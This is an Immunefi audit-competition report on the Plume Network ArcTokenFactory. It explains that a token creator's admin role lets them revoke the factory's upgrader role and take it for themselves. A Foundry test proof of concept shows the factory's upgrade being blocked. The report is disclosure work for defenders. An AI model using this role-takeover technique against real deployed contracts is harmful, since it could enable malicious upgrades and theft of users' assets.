# 51589 sc high tokencreator retains upgrade rights fix remains insufficient finding 01 immunefi report

**Submitted on Aug 4th 2025 at 09:18:55 UTC by @Boraicho for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network)

* **Report ID:** #51589
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcTokenFactory.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief / Introduction

When a new `ArcToken` is created using the `createToken` function, the `ADMIN_ROLE` is granted to the `msg.sender` (i.e., the token creator):

```solidity
token.grantRole(token.DEFAULT_ADMIN_ROLE(), msg.sender);
token.grantRole(token.ADMIN_ROLE(), msg.sender);
```

This setup allows the token creator to remove or bypass the `UPGRADER_ROLE`, which is intended to be exclusively assigned to the `TokenFactoryAdmin`.

***

### Vulnerability Details

The token creator can override the intended control of the `ArcTokenFactory` over the token’s implementation logic. This undermines the security and trust assumptions of the factory, as upgrade permissions can be exploited without factory or governance oversight to upgrade to malicious implementation contracts.

***

### Impact Details

This issue was classified as **critical** in the Immunefi report. The Arc system is designed to be a trusted platform where multiple token implementations can coexist, but still under the centralised governance of the system. A malicious token creator could leverage the system’s branding to gain user trust, then upgrade the token with malicious logic—potentially resulting in theft of user assets.

***

### References

The following function represents the upgrade logic, which **should only** be callable by the `TokenFactoryAdmin`:

```solidity
function upgradeToken(address token, address newImplementation) external onlyRole(DEFAULT_ADMIN_ROLE)
```

***

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { ArcToken } from "../src/ArcToken.sol";
import { ArcTokenFactory } from "../src/ArcTokenFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Strings } from "@openzeppelin/contracts/utils/Strings.sol";
import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";

// Import necessary restriction contracts and interfaces
import { RestrictionsRouter } from "../src/restrictions/RestrictionsRouter.sol";
import { WhitelistRestrictions } from "../src/restrictions/WhitelistRestrictions.sol";
import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ArcTokenFactoryTest is Test {

    ArcTokenFactory public factory;
    RestrictionsRouter public router;
    ERC20Mock public yieldToken;

    address public admin;
    address public deployer;
    address public user;
    address public malicousTokenCreator;

    event TokenCreated(
        address indexed tokenAddress,
        address indexed owner,
        address indexed implementation,
        string name,
        string symbol,
        string tokenUri,
        uint8 decimals
    );
    event ImplementationWhitelisted(address indexed implementation);
    event ImplementationRemoved(address indexed implementation);

    // Define module type constants matching ArcToken/Factory
    bytes32 public constant TRANSFER_RESTRICTION_TYPE = keccak256("TRANSFER_RESTRICTION");
    bytes32 public constant YIELD_RESTRICTION_TYPE = keccak256("YIELD_RESTRICTION");

    function setUp() public {
        admin = address(this);
        deployer = makeAddr("deployer");
        user = makeAddr("user");
        malicousTokenCreator = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

        // Deploy mock yield token
        yieldToken = new ERC20Mock();

        // Deploy Router
        router = new RestrictionsRouter();
        router.initialize(admin); // Initialize router with admin

        // Deploy factory
        factory = new ArcTokenFactory();
        factory.initialize(address(router)); // Initialize factory with router address
    }

   

    // ============ Token Upgrade Tests ============

    function test_UpgradeToken() public {
        // Create initial token with msg.sender falling under malicousToken;
        vm.startPrank(malicousTokenCreator);
        
        address tokenAddress = factory.createToken(
            "Test Token",
            "TEST",
            1000e18,
            address(yieldToken),
            "uri",
            admin,
            18
        );

       vm.stopPrank();


        address initialImpl = factory.getTokenImplementation(tokenAddress);


        // Create new implementation
        address newImpl = address(new ArcToken());
        factory.whitelistImplementation(newImpl);
        

        vm.startPrank(malicousTokenCreator);  
         ArcToken(tokenAddress).revokeRole(keccak256("UPGRADER_ROLE"), address(factory));
         ArcToken(tokenAddress).grantRole(keccak256("UPGRADER_ROLE"), malicousTokenCreator);
        vm.stopPrank();

        vm.expectRevert();
        factory.upgradeToken(tokenAddress, newImpl);

       
    }
}
```

***

## Understanding the POC

{% stepper %}
{% step %}

### Prepare the test environment

* Navigate to the `attackathon-plume-network/arc/test` directory.
* Replace all code in `ArcTokenFactory.t.sol` with the Proof of Concept code provided above.
  {% endstep %}

{% step %}

### Run the test

Execute the following command:

```bash
forge test --match-path ArcTokenFactory --match-test test_UpgradeToken --via-ir -vvvvvvvv
```

{% endstep %}

{% step %}

### What to Observe

* The final line of the test **reverts** when the factory owner attempts to upgrade the contract.
* This happens because the token deployer has **revoked the factory's `UPGRADER_ROLE`** and assigned it to themselves, preventing the factory from performing the upgrade.
  {% endstep %}
  {% endstepper %}
